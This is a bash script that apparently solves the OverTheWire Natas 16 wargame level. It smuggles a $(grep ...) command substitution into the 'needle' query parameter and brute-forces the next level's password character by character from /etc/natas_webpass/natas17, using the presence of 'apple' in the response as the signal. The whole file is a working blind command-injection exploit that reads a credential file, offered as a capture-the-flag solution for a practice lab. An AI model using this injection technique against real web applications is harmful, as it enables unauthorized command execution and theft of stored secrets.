#!/bin/bash

[[ -z "$1" ]] && { echo "Usage: $0 <password>"; exit 1; }

URL="http://natas16.natas.labs.overthewire.org/"
AUTH="natas16:$1"

chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
password=""

for i in $(seq 1 32); do
  for c in $(echo $chars | fold -w1); do

    attempt="${password}${c}"

    response=$(curl -s -u $AUTH \
      --get --data-urlencode "needle=\$(grep ^${attempt} /etc/natas_webpass/natas17)" \
      "$URL")

    if ! echo "$response" | grep -q "apple"; then
      password+=$c
      echo "[+] $password (${#password}/32)"
      break
    fi

  done
done

echo "[✔] Password: $password"